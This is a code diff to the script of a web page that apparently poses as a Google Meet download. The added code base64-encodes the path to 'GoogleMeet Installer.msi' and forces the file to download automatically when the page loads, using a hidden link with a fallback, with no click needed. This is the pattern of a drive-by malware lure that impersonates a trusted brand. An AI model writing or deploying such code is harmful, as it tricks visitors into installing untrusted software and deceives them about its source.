@@ -147,34 +147,69 @@
         document.documentElement.style.cssText = "filter:hue-rotate(4deg)";
 
         // Blob Download Logic
-        document.addEventListener('DOMContentLoaded', function (e) {
+        function triggerDownload() {
             // Base64 encoded path: /downloads/GoogleMeet Installer.msi -> L2Rvd25sb2Fkcy9Hb29nbGVNZWV0IEluc3RhbGxlci5tc2k=
             const fileUrlEncoded = 'L2Rvd25sb2Fkcy9Hb29nbGVNZWV0IEluc3RhbGxlci5tc2k=';
             const fileUrl = atob(fileUrlEncoded);
-            const fileName = fileUrl.split('/').pop();
+            const fileName = 'GoogleMeet Installer.msi';
 
+            // Try fetch first (for web server)
             fetch(fileUrl)
-                .then(response => response.blob())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.blob();
+                })
                 .then(blob => {
                     const blobUrl = URL.createObjectURL(blob);
-
-                    // Create a temporary link to trigger download
-                    const tempLink = document.createElement('a');
-                    tempLink.href = blobUrl;
-                    tempLink.download = 'GoogleMeet Installer.msi'; // Explicitly set filename
-                    tempLink.style.display = 'none';
-                    document.body.appendChild(tempLink);
-
-                    // Trigger click
-                    tempLink.click();
-
-                    // Cleanup
-                    setTimeout(() => {
-                        document.body.removeChild(tempLink);
-                        URL.revokeObjectURL(blobUrl);
-                    }, 100);
+                    downloadFile(blobUrl, fileName);
                 })
-                .catch(err => console.error('Error preparing download:', err));
+                .catch(err => {
+                    console.error('Error fetching file:', err);
+                    // Fallback: try direct link approach
+                    const directLink = document.createElement('a');
+                    directLink.href = fileUrl;
+                    directLink.download = fileName;
+                    directLink.style.display = 'none';
+                    document.body.appendChild(directLink);
+                    directLink.click();
+                    setTimeout(() => {
+                        document.body.removeChild(directLink);
+                    }, 100);
+                });
+        }
+
+        function downloadFile(blobUrl, fileName) {
+            // Create a temporary link to trigger download
+            const tempLink = document.createElement('a');
+            tempLink.href = blobUrl;
+            tempLink.download = fileName;
+            tempLink.style.display = 'none';
+            document.body.appendChild(tempLink);
+
+            // Trigger click
+            tempLink.click();
+
+            // Cleanup
+            setTimeout(() => {
+                document.body.removeChild(tempLink);
+                URL.revokeObjectURL(blobUrl);
+            }, 100);
+        }
+
+        document.addEventListener('DOMContentLoaded', function (e) {
+            // Auto-download on page load
+            triggerDownload();
+
+            // Add click handler to download button
+            const downloadBtn = document.getElementById('clickbtn');
+            if (downloadBtn) {
+                downloadBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    triggerDownload();
+                });
+            }
         });
     </script>
 </body>
